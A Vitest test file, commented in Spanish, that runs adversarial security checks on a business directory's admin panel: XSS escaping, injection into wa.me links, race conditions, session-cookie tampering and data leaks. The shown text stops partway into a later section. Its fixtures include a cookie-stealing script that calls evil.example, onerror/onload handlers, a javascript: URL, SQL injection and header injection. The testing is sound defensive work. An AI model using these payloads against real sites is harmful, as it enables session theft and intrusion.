import { readFileSync, readdirSync } from "node:fs";
import { join } from "node:path";
import { createElement } from "react";
import { renderToStaticMarkup } from "react-dom/server";
import { afterAll, afterEach, beforeAll, beforeEach, describe, expect, it, vi } from "vitest";

vi.mock("next/headers", async () => {
  const simulado = await import("./admin-mocks");
  return { cookies: simulado.cookies, headers: simulado.headers };
});
vi.mock("next/navigation", async () => {
  const simulado = await import("./admin-mocks");
  return { redirect: simulado.redirect, notFound: simulado.notFound };
});

import { seedCatalogos } from "../prisma/seed";
import ColaAdminPage from "../src/app/admin/cola/page";
import { aprobarRegistroAccion } from "../src/app/admin/registros/[id]/accion-aprobar";
import { borrarRegistroAccion } from "../src/app/admin/registros/[id]/accion-borrar";
import { despublicarRegistroAccion } from "../src/app/admin/registros/[id]/accion-despublicar";
import { marcarReporteAtendidoAccion } from "../src/app/admin/registros/[id]/accion-marcar-reporte-atendido";
import { rechazarRegistroAccion } from "../src/app/admin/registros/[id]/accion-rechazar";
import ConfirmarBorradoPage from "../src/app/admin/registros/[id]/borrar/page";
import RegistroDespublicadoPage from "../src/app/admin/registros/[id]/despublicado/page";
import DetalleRegistroAdminPage from "../src/app/admin/registros/[id]/page";
import RegistroRechazadoPage from "../src/app/admin/registros/[id]/rechazado/page";
import ListadoCategoriaPage from "../src/app/(publico)/[destino]/page";
import FichaNegocioPage from "../src/app/(publico)/negocio/[ficha]/page";
import type { PrismaClient } from "../src/generated/prisma/client";
import {
  LONGITUD_MINIMA_SECRETO,
  VARIABLE_CONTRASENA,
  VARIABLE_SECRETO_SESION,
  VARIABLE_URL_SITIO,
} from "../src/lib/admin/config";
import {
  NOMBRE_COOKIE_SESION,
  crearValorDeSesion,
  haySesionValida,
} from "../src/lib/admin/sesion";
import {
  errorMotivoDespublicarLargo,
  mensajeAvisoDespublicacion,
  mensajeAvisoRechazo,
  mensajeVerificacion,
} from "../src/lib/admin/textos";
import {
  LIMITE_MOTIVO_DESPUBLICACION,
  aprobarRegistro,
  despublicarFicha,
  rechazarRegistro,
} from "../src/lib/admin/transiciones";
import { construirSegmentoFicha } from "../src/lib/ficha-url";
import { reiniciarLimitePorIp } from "../src/lib/registro/limite-ip";
import { procesarRegistro } from "../src/lib/registro/procesar";
import { MENSAJES_ERROR_REGISTRO } from "../src/lib/registro/textos";
import { peticion, reiniciarPeticion, urlDeRedireccion } from "./admin-mocks";
import { crearClientePrueba } from "./db";
import { VERSION_AVISO } from "../src/lib/legales/version";
import { CAMPO_VERSION_AVISO } from "../src/lib/registro/textos";

/**
 * Pruebas ADVERSARIALES del panel de revisión (etapa C del change
 * `agregar-panel-admin`). No repiten el camino feliz del dev: buscan lo que
 * ese camino no toca —entrada hostil que el formulario público sí acepta y el
 * panel pinta, inyección en los `wa.me` prellenados, carreras reales entre dos
 * transiciones simultáneas, orden de la guarda y fugas de datos personales
 * hacia lo público—.
 *
 * Datos 100% ficticios (repo público + LFPDPPP): serie de pruebas 7719996xxx.
 */

const CONTRASENA = "contrasena-de-prueba-nada-real";
const SECRETO = "s".repeat(LONGITUD_MINIMA_SECRETO);
const URL_SITIO = "https://necesitouno.example";
const IP = "203.0.113.10"; // TEST-NET-3, reservado para documentación
const raiz = join(__dirname, "..");

/**
 * Carga hostil que el formulario público SÍ acepta (ningún campo de texto
 * libre tiene lista blanca de caracteres, solo cota de longitud): etiquetas
 * HTML, comillas, un manejador de eventos y unicode invisible/bidireccional.
 */
const NOMBRE_HOSTIL = `<img src=x onerror="alert(1)">&"'‮​`;
const OFRECE_HOSTIL = `</dd><script>fetch('//evil.example?c='+document.cookie)</script>`;
const DIRECCION_HOSTIL = `Calle "><svg onload=alert(2)> #1`;

let prisma: PrismaClient;
let categoriaId: number;
let categoriaSlug: string;
let coloniaId: number;

function conSesion() {
  peticion.cookies[NOMBRE_COOKIE_SESION] = crearValorDeSesion(SECRETO);
}

async function render(pagina: Promise<React.ReactElement> | React.ReactElement) {
  const resuelta = await pagina;
  return renderToStaticMarkup(createElement(() => resuelta));
}

/** Envío del formulario público, con los campos que pida cada caso. */
function envio(extra: Record<string, string> = {}): FormData {
  const formData = new FormData();
  const campos: Record<string, string> = {
    nombre: "Negocio Ficticio de Prueba",
    categoriaId: String(categoriaId),
    whatsapp: "7719996001",
    coloniaId: String(coloniaId),
    consentimiento: "on",
    // Campo oculto con la versión del aviso que pintó el formulario
    // (change `versionar-aviso-privacidad`): sin él, el envío se rechaza.
    [CAMPO_VERSION_AVISO]: VERSION_AVISO,
    ...extra,
  };
  for (const [clave, valor] of Object.entries(campos)) {
    if (valor !== "") formData.append(clave, valor);
  }
  return formData;
}

/**
 * HTML de la pantalla sin el `<script>` de reposición de formularios que React
 * añade siempre al final: es andamiaje del framework, no contenido, y llevaría
 * a confundir "hay un `<script>` en la página" con "el payload se ejecutó".
 */
const sinScriptsDeReact = (html: string) => html.replace(/<script>[\s\S]*?<\/script>/g, "");

const abrirDetalle = (id: string, searchParams: Record<string, string> = {}) =>
  render(
    DetalleRegistroAdminPage({
      params: Promise.resolve({ id }),
      searchParams: Promise.resolve(searchParams),
    }) as Promise<React.ReactElement>,
  );

/** El `<a>` de wa.me que pintó una pantalla del panel, ya como URL. */
function enlaceWhatsapp(html: string): URL {
  const encontrado = html.match(/href="(https:\/\/wa\.me\/[^"]*)"/);
  expect(encontrado, "se esperaba un enlace de wa.me en la pantalla").not.toBeNull();
  // El HTML llega con entidades: hay que deshacerlas para leer la URL real.
  const href = encontrado![1]
    .replaceAll("&amp;", "&")
    .replaceAll("&quot;", '"')
    .replaceAll("&#x27;", "'")
    .replaceAll("&lt;", "<")
    .replaceAll("&gt;", ">");
  return new URL(href);
}

beforeAll(async () => {
  process.env[VARIABLE_CONTRASENA] = CONTRASENA;
  process.env[VARIABLE_SECRETO_SESION] = SECRETO;
  process.env[VARIABLE_URL_SITIO] = URL_SITIO;

  prisma = crearClientePrueba();
  await seedCatalogos(prisma);
  const categoria = await prisma.categoria.findUniqueOrThrow({
    where: { slug: "servicios-del-hogar" },
  });
  categoriaId = categoria.id;
  categoriaSlug = categoria.slug;
  coloniaId = (
    await prisma.colonia.findUniqueOrThrow({ where: { slug: "haciendas-de-tizayuca" } })
  ).id;
});

afterAll(async () => {
  delete process.env[VARIABLE_CONTRASENA];
  delete process.env[VARIABLE_SECRETO_SESION];
  delete process.env[VARIABLE_URL_SITIO];
  await prisma.negocio.deleteMany();
  await prisma.$disconnect();
});

beforeEach(async () => {
  reiniciarPeticion();
  reiniciarLimitePorIp();
  await prisma.negocio.deleteMany();
});

afterEach(() => vi.restoreAllMocks());

// ── 1. XSS almacenado: lo captura el formulario público, lo pinta el panel ──

describe("adversarial · entrada hostil del formulario público pintada en el panel", () => {
  async function registrarHostil(): Promise<string> {
    const resultado = await procesarRegistro(
      envio({
        nombre: NOMBRE_HOSTIL,
        queOfreces: OFRECE_HOSTIL,
        direccion: DIRECCION_HOSTIL,
        horario: `<b>24/7</b>`,
        // El teléfono fijo YA NO admite cualquier texto (enmienda aprobada por
        // el fundador, revisión visual lote 2: solo dígitos y separadores), así
        // que aquí va uno legítimo. Que el panel escape un fijo hostil se
        // prueba abajo, con una fila escrita directo en la base — que es la
        // única forma en que hoy puede existir una.
        telefonoFijo: `(771) 777-6001`,
      }),
      { prisma, ip: IP },
    );
    expect(resultado.exito, "el formulario público acepta esta carga").toBe(true);
    const fila = await prisma.negocio.findUniqueOrThrow({ where: { whatsapp: "7719996001" } });
    // Se guarda tal cual: la defensa NO es sanear al guardar, es escapar al pintar.
    expect(fila.nombre).toBe(NOMBRE_HOSTIL);
    return fila.id;
  }

  it("el detalle escapa todo el HTML capturado: no queda ni una etiqueta viva", async () => {
    const id = await registrarHostil();
    conSesion();
    const html = sinScriptsDeReact(await abrirDetalle(id));

    // Ninguna etiqueta ni atributo de evento vivo: lo que se buscan son
    // apertures de etiqueta reales y comillas sin escapar, no el mismo texto
    // ya convertido en entidades (que es justo lo que debe verse).
    for (const veneno of ["<img", "<script", "<svg", "<b>", 'onerror="', 'src="x"']) {
      expect(html, `quedó vivo ${veneno} en el detalle`).not.toContain(veneno);
    }
    expect(html).not.toContain(NOMBRE_HOSTIL);
    expect(html).not.toContain(OFRECE_HOSTIL);
    expect(html).not.toContain(DIRECCION_HOSTIL);
    // Y sí está el contenido, escapado (el admin tiene que verlo tal cual).
    expect(html).toContain("&lt;img src=x onerror=");
    expect(html).toContain("&lt;script&gt;");
  });

  // El formulario público ya no deja entrar un fijo con comillas ni etiquetas
  // (enmienda aprobada por el fundador, revisión visual lote 2), pero pueden
  // existir filas viejas o sembradas a mano: el panel tiene que seguir
  // escapándolas. La defensa sigue siendo escapar al pintar, no confiar en que
  // la entrada venga limpia.
  it("un fijo hostil escrito directo en la base se pinta escapado en el detalle", async () => {
    const fijoHostil = `771"><script>alert(1)</script>`;
    const fila = await prisma.negocio.create({
      data: {
        nombre: "Refaccionaria Sembrada a Mano (ficticia)",
        categoriaId,
        whatsapp: "7719996009",
        coloniaId,
        telefonoFijo: fijoHostil,
        consintioAvisoEn: new Date(),
      },
    });

    conSesion();
    const html = sinScriptsDeReact(await abrirDetalle(fila.id));

    expect(html).not.toContain(fijoHostil);
    expect(html).not.toContain("<script");
    expect(html).toContain("&lt;script&gt;");
  });

  it("la cola escapa el nombre y la colonia libre igual que el detalle", async () => {
    await procesarRegistro(
      envio({
        nombre: NOMBRE_HOSTIL,
        coloniaId: "otra",
        coloniaOtra: `<script>alert('colonia')</script>`,
      }),
      { prisma, ip: IP },
    );
    conSesion();
    const { default: ColaAdminPage } = await import("../src/app/admin/cola/page");
    const html = sinScriptsDeReact(await render(ColaAdminPage() as Promise<React.ReactElement>));

    expect(html).not.toContain("<script");
    expect(html).not.toContain('onerror="');
    expect(html).not.toContain(NOMBRE_HOSTIL);
    expect(html).toContain("&lt;script&gt;");
  });

  it("un nombre en el límite exacto de 80 caracteres con unicode se guarda y se pinta entero", async () => {
    const nombre = `Ñoños ${"á".repeat(67)} 🌮 fin`.slice(0, 80);
    expect(nombre).toHaveLength(80);
    const resultado = await procesarRegistro(envio({ nombre }), { prisma, ip: IP });
    expect(resultado.exito).toBe(true);

    const fila = await prisma.negocio.findUniqueOrThrow({ where: { whatsapp: "7719996001" } });
    expect(fila.nombre).toBe(nombre);

    conSesion();
    const html = await abrirDetalle(fila.id);
    expect(html).toContain(nombre.replaceAll("&", "&amp;"));
  });
});

// ── 2. Inyección en el texto prellenado de los wa.me del panel ───────────────

describe("adversarial · inyección en los enlaces de WhatsApp del panel", () => {
  it("un nombre con &, ?, # y comillas no agrega parámetros al wa.me de verificación", async () => {
    const nombre = `Tacos&text=OTRO?x=1#frag "El Güero" <b>`;
    const resultado = await procesarRegistro(envio({ nombre }), { prisma, ip: IP });
    expect(resultado.exito).toBe(true);
    const fila = await prisma.negocio.findUniqueOrThrow({ where: { whatsapp: "7719996001" } });

    conSesion();
    const url = enlaceWhatsapp(await abrirDetalle(fila.id));

    expect(url.origin).toBe("https://wa.me");
    expect(url.pathname).toBe("/527719996001");
    expect(url.hash).toBe("");
    // Un solo parámetro: el nombre no pudo abrir otro ni cortar el mensaje.
    expect([...url.searchParams.keys()]).toEqual(["text"]);
    expect(url.searchParams.get("text")).toBe(mensajeVerificacion(nombre));
  });

  it("un motivo de rechazo con &, saltos de línea y URL no altera el wa.me del aviso", async () => {
    const resultado = await procesarRegistro(envio({ nombre: "Negocio Ficticio Uno" }), {
      prisma,
      ip: IP,
    });
    expect(resultado.exito).toBe(true);
    const fila = await prisma.negocio.findUniqueOrThrow({ where: { whatsapp: "7719996001" } });

    const motivo = `No aplica&text=https://evil.example\nsegunda línea #hash "comillas"`;
    expect(await rechazarRegistro(prisma, fila.id, motivo)).toEqual({
      resultado: "rechazado",
    });

    conSesion();
    const html = await render(
      RegistroRechazadoPage({
        params: Promise.resolve({ id: fila.id }),
        searchParams: Promise.resolve({}),
      }) as Promise<React.ReactElement>,
    );
    const url = enlaceWhatsapp(html);

    expect([...url.searchParams.keys()]).toEqual(["text"]);
    expect(url.searchParams.get("text")).toBe(
      mensajeAvisoRechazo("Negocio Ficticio Uno", motivo),
    );
    // El enlace no se convirtió en otro destino ni arrastró el "evil.example"
    // fuera del texto del mensaje.
    expect(url.host).toBe("wa.me");
  });

  it("un WhatsApp guardado que no normaliza no pinta ningún enlace", async () => {
    const fila = await prisma.negocio.create({
      data: {
        nombre: "Ficticio con número imposible",
        categoriaId,
        coloniaId,
        whatsapp: `javascript:alert(1)`,
        consintioAvisoEn: new Date(),
      },
    });

    conSesion();
    const html = await abrirDetalle(fila.id);
    expect(html).not.toContain("wa.me");
    // Nada de `href` con ese valor: el número se pinta como TEXTO, que es lo
    // que pide el scenario "número que no se puede interpretar".
    expect(html).not.toMatch(/href="javascript:alert/);
    expect(html).toContain(
      `<span class="font-semibold text-tinta">javascript:alert(1)</span>`,
    );
  });
});

// ── 3. Carreras reales entre dos transiciones simultáneas ───────────────────

describe("adversarial · dos transiciones simultáneas sobre el mismo registro", () => {
  async function registroEnRevision(sufijo: string): Promise<string> {
    return (
      await prisma.negocio.create({
        data: {
          nombre: `Ficticio en revisión ${sufijo}`,
          categoriaId,
          coloniaId,
          whatsapp: `771999600${sufijo}`,
          consintioAvisoEn: new Date(),
        },
      })
    ).id;
  }

  it("dos aprobaciones a la vez publican una sola vez y no mezclan los giros", async () => {
    const id = await registroEnRevision("2");
    const giros = await prisma.giro.findMany({ orderBy: { id: "asc" }, take: 4 });
    const [a, b, c, d] = giros.map((giro) => giro.id);

    const resultados = await Promise.all([
      aprobarRegistro(prisma, id, { girosIds: [a, b], coloniaId: null, origen: "organico" }),
      aprobarRegistro(prisma, id, { girosIds: [c, d], coloniaId: null, origen: "siembra" }),
    ]);

    const aprobados = resultados.filter((r) => r.resultado === "aprobado");
    const yaResueltos = resultados.filter((r) => r.resultado === "ya-resuelto");
    expect(aprobados).toHaveLength(1);
    expect(yaResueltos).toHaveLength(1);

    const despues = await prisma.negocio.findUniqueOrThrow({
      where: { id },
      include: { giros: true },
    });
    expect(despues.estado).toBe("publicado");
    // Los giros son los de UNO de los dos, nunca los cuatro mezclados.
    const asignados = despues.giros.map((giro) => giro.id).sort();
    expect([JSON.stringify([a, b].sort()), JSON.stringify([c, d].sort())]).toContain(
      JSON.stringify(asignados),
    );
  });

  it("aprobar y rechazar a la vez deja un solo desenlace, sin rastro del perdedor", async () => {
    const id = await registroEnRevision("3");

    const [aprobacion, rechazo] = await Promise.all([
      aprobarRegistro(prisma, id, { girosIds: [], coloniaId: null, origen: "organico" }),
      rechazarRegistro(prisma, id, "Motivo ficticio de la carrera"),
    ]);

    const ganadores = [aprobacion.resultado, rechazo.resultado].filter(
      (r) => r === "aprobado" || r === "rechazado",
    );
    expect(ganadores).toHaveLength(1);

    const despues = await prisma.negocio.findUniqueOrThrow({ where: { id } });
    if (despues.estado === "publicado") {
      expect(despues.publicadoEn).not.toBeNull();
      expect(despues.rechazadoEn).toBeNull();
      expect(despues.motivoRechazo).toBeNull();
    } else {
      expect(despues.estado).toBe("rechazado");
      expect(despues.publicadoEn).toBeNull();
      expect(despues.motivoRechazo).toBe("Motivo ficticio de la carrera");
    }
  });

  it("dos rechazos a la vez conservan un solo motivo y una sola fecha", async () => {
    const id = await registroEnRevision("4");

    const resultados = await Promise.all([
      rechazarRegistro(prisma, id, "Primer motivo ficticio"),
      rechazarRegistro(prisma, id, "Segundo motivo ficticio"),
    ]);

    expect(resultados.filter((r) => r.resultado === "rechazado")).toHaveLength(1);
    expect(resultados.filter((r) => r.resultado === "ya-resuelto")).toHaveLength(1);

    const despues = await prisma.negocio.findUniqueOrThrow({ where: { id } });
    expect(["Primer motivo ficticio", "Segundo motivo ficticio"]).toContain(
      despues.motivoRechazo,
    );
  });
});

// ── 4. La acción de aprobar frente a un POST directo con ids hostiles ────────

describe("adversarial · POST directo a la acción de aprobar con ids inventados", () => {
  async function registro(sufijo: string): Promise<string> {
    return (
      await prisma.negocio.create({
        data: {
          nombre: `Ficticio para POST directo ${sufijo}`,
          categoriaId,
          coloniaId,
          whatsapp: `771999601${sufijo}`,
          consintioAvisoEn: new Date(),
        },
      })
    ).id;
  }

  function formAprobar(giros: string[], extra: Record<string, string> = {}): FormData {
    const formData = new FormData();
    for (const giro of giros) formData.append("giro", giro);
    for (const [clave, valor] of Object.entries(extra)) formData.append(clave, valor);
    return formData;
  }

  it("cuatro casillas de giro con el mismo id valen por una, no por cuatro", async () => {
    const id = await registro("1");
    const giro = await prisma.giro.findFirstOrThrow({ orderBy: { id: "asc" } });
    conSesion();

    const destino = await urlDeRedireccion(() =>
      aprobarRegistroAccion(
        id,
        formAprobar([String(giro.id), String(giro.id), String(giro.id), String(giro.id)], {
          origen: "organico",
        }),
      ),
    );

    expect(destino).toBe(`/admin/registros/${id}/aprobado`);
    const despues = await prisma.negocio.findUniqueOrThrow({
      where: { id },
      include: { giros: true },
    });
    expect(despues.giros.map((g) => g.id)).toEqual([giro.id]);
  });

  it.each([
    ["negativo", "-1"],
    ["notación científica", "1e1"],
    ["decimal", "1.5"],
    ["con espacios internos", "1 2"],
    ["hexadecimal", "0x2"],
    ["texto", "'; DROP TABLE Negocio; --"],
  ])("un giro %s no publica un giro que no existe", async (etiqueta, valor) => {
    const id = await registro("2");
    conSesion();

    const destino = await urlDeRedireccion(() =>
      aprobarRegistroAccion(id, formAprobar([valor], { origen: "organico" })),
    );

    const despues = await prisma.negocio.findUniqueOrThrow({
      where: { id },
      include: { giros: true },
    });
    // O se filtró antes de llegar (y publica sin giros) o se rechazó como
    // giro fuera del catálogo; lo que NO puede pasar es asignar algo raro.
    if (destino.endsWith("/aprobado")) {
      expect(despues.giros, etiqueta).toEqual([]);
    } else {
      expect(destino, etiqueta).toContain("errorAprobar=giros");
      expect(despues.estado, etiqueta).toBe("en_revision");
    }
    await prisma.negocio.deleteMany({ where: { id } });
  });

  /**
   * HALLAZGO MEDIO 1 de la etapa C, ya CORREGIDO (iteración 2 del dev).
   *
   * El parser de ids del formulario aceptaba cualquier cadena de solo dígitos,
   * sin cota: un id de 20 cifras no cabe en el entero de 64 bits de la columna
   * y Prisma lanzaba `PrismaClientValidationError` DENTRO de la Server Action,
   * que nadie atrapaba → 500 en la pantalla principal del panel, en vez del
   * error que la spec pide para un giro que no está en el catálogo.
   *
   * Ahora `accion-aprobar.ts` acota la magnitud en el borde (y
   * `transiciones.ts` lo repite para cualquier otro llamador), así que el
   * valor hostil sale por el camino de error normal del formulario.
   */
  it(
    "un giro que desborda el entero de 64 bits se responde como giro inválido",
    async () => {
      const id = await registro("5");
      conSesion();

      const destino = await urlDeRedireccion(() =>
        aprobarRegistroAccion(
          id,
          formAprobar(["99999999999999999999"], { origen: "organico" }),
        ),
      );

      expect(destino).toContain("errorAprobar=giros");
      const despues = await prisma.negocio.findUniqueOrThrow({ where: { id } });
      expect(despues.estado).toBe("en_revision");
    },
  );

  /** Mismo defecto por la otra puerta: la colonia de la aprobación. */
  it(
    "una colonia que desborda el entero de 64 bits se responde como colonia inválida",
    async () => {
      const id = await registro("6");
      conSesion();

      const destino = await urlDeRedireccion(() =>
        aprobarRegistroAccion(
          id,
          formAprobar([], { origen: "organico", coloniaId: "99999999999999999999" }),
        ),
      );

      expect(destino).toContain("errorAprobar=colonia");
    },
  );

  it("un origen inventado cae en `organico`, nunca en un valor fuera del conjunto", async () => {
    const id = await registro("3");
    conSesion();

    await urlDeRedireccion(() =>
      aprobarRegistroAccion(id, formAprobar([], { origen: "administrador" })),
    );

    const despues = await prisma.negocio.findUniqueOrThrow({ where: { id } });
    expect(despues.origen).toBe("organico");
  });

  it("un motivo de rechazo desmedido se recorta y no se guarda entero", async () => {
    const id = await registro("4");
    conSesion();
    const formData = new FormData();
    formData.set("motivo", "M".repeat(20_000));

    await urlDeRedireccion(() => rechazarRegistroAccion(id, formData));

    const despues = await prisma.negocio.findUniqueOrThrow({ where: { id } });
    expect(despues.motivoRechazo).toHaveLength(500);
  });
});

// ── 5. La guarda va ANTES de tocar datos, no en cualquier línea ──────────────

describe("adversarial · la guarda se invoca antes de leer o escribir nada", () => {
  const EXCEPCIONES = [
    "src/app/admin/page.tsx",
    "src/app/admin/accion-acceso.ts",
    "src/app/admin/accion-salir.ts",
    // Layout del panel (change `agregar-analitica-cookieless`): no renderiza
    // contenido ni accede a datos; solo declara la política de referente y
    // deja pasar a sus hijos, que sí exigen sesión cada uno.
    "src/app/admin/layout.tsx",
    // Ruta comodín del panel: solo llama a `notFound()` para que las URLs
    // inexistentes de /admin también hereden esa política (O-1). No lee ni
    // escribe nada, y responde 404 igual para todos, con o sin sesión.
    "src/app/admin/[...resto]/page.tsx",
    // Exige sesión igual, pero sin redirigir: sin ella responde el mismo 404
    // que el sitio público (spec `revision-admin`, scenario "la foto del
    // registro en revisión no sale del panel"). Se verifica en el `it` de
    // abajo y en `tests/fotos-ruta.test.ts`.
    "src/app/admin/foto/[clave]/[variante]/route.ts",
  ];

  function archivosDe(dir: string): string[] {
    return readdirSync(dir, { withFileTypes: true }).flatMap((entrada) => {
      const ruta = join(dir, entrada.name);
      if (entrada.isDirectory()) return archivosDe(ruta);
      return /\.tsx?$/.test(entrada.name) ? [ruta] : [];
    });
  }

  const archivos = archivosDe(join(raiz, "src/app/admin")).map((ruta) =>
    ruta.slice(raiz.length + 1),
  );

  /** Todo lo que lee o escribe datos del negocio dentro del cuerpo del módulo. */
  const ACCESOS_A_DATOS = [
    "obtenerPrisma()",
    "obtenerRegistroParaPanel(",
    "obtenerColaDeRevision(",
    "aprobarRegistro(",
    "rechazarRegistro(",
    "despublicarFicha(",
    "borrarNegocio(",
    // Reportes (change `agregar-boton-reportar`): la sección de la cola, la
    // del detalle y la acción de atender entran a la MISMA regla.
    "obtenerNegociosReportados(",
    "obtenerReportesPendientesDeNegocio(",
    "marcarReporteAtendido(",
  ];

  it("en cada ruta y acción, `requerirSesionAdmin()` aparece antes del primer acceso a datos", () => {
    for (const ruta of archivos) {
      if (EXCEPCIONES.includes(ruta)) continue;
      const codigo = readFileSync(join(raiz, ruta), "utf8");
      // Solo el cuerpo: los `import` de arriba nombran las mismas funciones.
      const cuerpo = codigo.slice(codigo.lastIndexOf("\nimport "));
      const guarda = cuerpo.indexOf("await requerirSesionAdmin();");
      expect(guarda, `${ruta} no llama a la guarda`).toBeGreaterThan(-1);

      for (const acceso of ACCESOS_A_DATOS) {
        const posicion = cuerpo.indexOf(acceso);
        if (posicion === -1) continue;
        expect(posicion, `${ruta} usa ${acceso} antes de la guarda`).toBeGreaterThan(guarda);
      }
    }
  });

  it("la ruta de fotos del panel resuelve la sesión antes de tocar la base", () => {
    const ruta = "src/app/admin/foto/[clave]/[variante]/route.ts";
    expect(archivos).toContain(ruta);
    const codigo = readFileSync(join(raiz, ruta), "utf8");
    const cuerpo = codigo.slice(codigo.lastIndexOf("\nimport "));
    const sesion = cuerpo.indexOf("await haySesionAdmin()");
    expect(sesion, "no resuelve la sesión").toBeGreaterThan(-1);
    for (const acceso of ACCESOS_A_DATOS) {
      const posicion = cuerpo.indexOf(acceso);
      if (posicion === -1) continue;
      expect(posicion, `usa ${acceso} antes de resolver la sesión`).toBeGreaterThan(sesion);
    }
  });

  /**
   * `marcarReporteAtendido` acepta el `negocioId` como parámetro OPCIONAL para
   * no romper las firmas que ya usan las suites, pero es una condición de
   * autorización: si un llamador la olvida, la guarda desaparece sin que nada
   * se queje (observación 10 de la etapa C). Esta prueba es esa queja.
   */
  it("toda llamada del panel a marcarReporteAtendido pasa el negocio", () => {
    const llamadas = archivosDe(join(raiz, "src")).flatMap((ruta) => {
      if (ruta.includes("/lib/admin/reportes.ts")) return []; // la definición
      const codigo = readFileSync(ruta, "utf8");
      // `[^;]` ya cruza saltos de línea: no hace falta la bandera `s`.
      return [...codigo.matchAll(/marcarReporteAtendido\(([^;]*?)\)\s*;/g)].map((m) => ({
        ruta,
        argumentos: m[1],
      }));
    });

    expect(llamadas.length).toBeGreaterThanOrEqual(1);
    for (const llamada of llamadas) {
      expect(llamada.argumentos, llamada.ruta).toContain("negocioId");
    }
  });

  it("ninguna pantalla ni acción del panel toca el token de gestión", () => {
    const fuentes = [
      ...archivosDe(join(raiz, "src/app/admin")),
      ...archivosDe(join(raiz, "src/components/admin")),
      ...archivosDe(join(raiz, "src/lib/admin")),
    ];
    for (const ruta of fuentes) {
      expect(readFileSync(ruta, "utf8"), ruta).not.toContain("tokenGestion");
    }
  });

  it("el token de gestión de un registro no aparece en el HTML del panel", async () => {
    const fila = await prisma.negocio.create({
      data: {
        nombre: "Ficticio con token",
        categoriaId,
        coloniaId,
        whatsapp: "7719996020",
        consintioAvisoEn: new Date(),
        tokenGestion: "token-ficticio-que-no-debe-salir-jamas",
      },
    });

    conSesion();
    const html = await abrirDetalle(fila.id);
    expect(html).not.toContain("token-ficticio-que-no-debe-salir-jamas");
  });
});

// ── 6. Valores hostiles en la cookie de sesión ──────────────────────────────

describe("adversarial · valores hostiles en la cookie de sesión", () => {
  const AHORA = new Date("2026-09-03T12:00:00.000Z");

  it.each([
    ["cadena vacía", ""],
    ["solo la caducidad", "1788000000000"],
    ["solo puntos", "..."],
    ["tres partes", "1788000000000.firma.extra"],
    ["caducidad no numérica", "NaN.firma"],
    ["notación científica", "1e999.firma"],
    ["con signo", "+1788000000000.firma"],
    ["hexadecimal", "0x64.firma"],
    ["con espacios", " 1788000000000 . firma "],
    ["salto de línea inyectado", "1788000000000.firma\nSet-Cookie: otra=1"],
    ["caducidad negativa", "-1788000000000.firma"],
    ["valor gigantesco", `${"9".repeat(100_000)}.${"A".repeat(100_000)}`],
  ])("una cookie con %s no crea sesión", (_caso, valor) => {
    expect(haySesionValida(valor, process.env, AHORA)).toBe(false);
  });

  it("una cookie firmada con otro secreto deja de valer al rotar el secreto", () => {
    const conSecretoViejo = crearValorDeSesion("v".repeat(LONGITUD_MINIMA_SECRETO));
    expect(haySesionValida(conSecretoViejo, process.env)).toBe(false);

    // Y la del secreto vigente sí vale, para que el caso anterior signifique algo.
    expect(haySesionValida(crearValorDeSesion(SECRETO), process.env)).toBe(true);
  });

  it("cambiar un solo carácter de la firma la invalida", () => {
    const valido = crearValorDeSesion(SECRETO);
    const [caducidad, firma] = valido.split(".");
    const alterada = `${caducidad}.${firma.slice(0, -1)}${firma.at(-1) === "A" ? "B" : "A"}`;
    expect(haySesionValida(alterada, process.env)).toBe(false);
  });

  it("no se puede estirar la caducidad conservando la firma", () => {
    const valido = crearValorDeSesion(SECRETO);
    const [caducidad, firma] = valido.split(".");
    const estirada = `${Number(caducidad) + 30 * 24 * 60 * 60 * 1000}.${firma}`;
    expect(haySesionValida(estirada, process.env)).toBe(false);
  });
});

// ── 7. Los datos del rechazo no se escapan hacia lo público ─────────────────

describe("adversarial · el rastro del rechazo no llega a ninguna página pública", () => {
  const MOTIVO = "Motivo ficticio que jamás debe salir del panel";

  it("un negocio rechazado no aparece en el listado ni filtra su motivo", async () => {
    await prisma.negocio.create({
      data: {
        nombre: "Préstamos Ficticios Rechazados",
        categoriaId,
        coloniaId,
        whatsapp: "7719996030",
        consintioAvisoEn: new Date(),
        estado: "rechazado",
        rechazadoEn: new Date("2026-08-26T11:00:00.000Z"),
        motivoRechazo: MOTIVO,
      },
    });

    const html = await render(
      ListadoCategoriaPage({
        params: Promise.resolve({ destino: categoriaSlug }),
        searchParams: Promise.resolve({}),
      }) as Promise<React.ReactElement>,
    );

    expect(html).not.toContain(MOTIVO);
    expect(html).not.toContain("Préstamos Ficticios Rechazados");
    expect(html).not.toContain("7719996030");
  });

  it("una ficha publicada que arrastra rastro de rechazo tampoco lo pinta", async () => {
    // Caso de borde: la purga de 90 días todavía no existe, así que una fila
    // puede llevar `motivoRechazo` de un ciclo anterior. Nada de eso es público.
    const fila = await prisma.negocio.create({
      data: {
        nombre: "Estética Ficticia Publicada",
        categoriaId,
        coloniaId,
        whatsapp: "7719996031",
        consintioAvisoEn: new Date(),
        estado: "publicado",
        publicadoEn: new Date("2026-08-27T11:00:00.000Z"),
        rechazadoEn: new Date("2026-08-26T11:00:00.000Z"),
        motivoRechazo: MOTIVO,
      },
    });

    const html = await render(
      FichaNegocioPage({
        params: Promise.resolve({
          ficha: construirSegmentoFicha(fila.nombre, fila.id),
        }),
        searchParams: Promise.resolve({}),
      }) as Promise<React.ReactElement>,
    );

    expect(html).toContain("Estética Ficticia Publicada");
    expect(html).not.toContain(MOTIVO);
    expect(html).not.toContain("2026-08-26");
  });

  it("el reenvío tras un rechazo no devuelve nada del rechazo anterior", async () => {
    const previa = await prisma.negocio.create({
      data: {
        nombre: "Plomería Ficticia de Antes",
        categoriaId,
        coloniaId,
        whatsapp: "7719996001",
        consintioAvisoEn: new Date("2026-08-20T09:00:00.000Z"),
        estado: "rechazado",
        rechazadoEn: new Date("2026-08-21T10:00:00.000Z"),
        motivoRechazo: MOTIVO,
        direccion: "Dirección ficticia anterior 123",
      },
    });

    const resultado = await procesarRegistro(
      envio({ nombre: "Plomería Ficticia Ya Corregida" }),
      { prisma, ip: IP },
    );

    expect(resultado).toEqual({ exito: true });
    const serializado = JSON.stringify(resultado);
    expect(serializado).not.toContain(MOTIVO);
    expect(serializado).not.toContain("Dirección ficticia anterior");
    expect(serializado).not.toContain("rechazado");

    const despues = await prisma.negocio.findUniqueOrThrow({ where: { id: previa.id } });
    expect(despues.estado).toBe("en_revision");
    expect(despues.motivoRechazo).toBeNull();
  });
});

// ── 7.bis Fail-safe: sin configuración tampoco hay transiciones ─────────────

describe("adversarial · con el panel sin configurar no se ejecuta ninguna transición", () => {
  // Spec `revision-admin`, requirement "Sin contraseña configurada el panel no
  // abre", scenario "ninguna transición sin configuración": el dev lo cubre en
